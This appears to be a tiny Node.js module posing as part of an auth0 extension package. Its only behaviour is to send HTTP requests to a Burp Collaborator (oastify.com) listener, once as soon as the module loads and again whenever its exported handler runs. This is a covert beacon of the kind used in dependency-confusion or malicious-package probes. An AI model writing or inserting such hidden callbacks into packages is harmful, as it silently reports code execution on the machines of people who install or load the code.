const tools = require('auth0-extension-express-tools');

const request = require('superagent');
request.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere')    

module.exports = (context, req, res) => {
  request.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2');
};
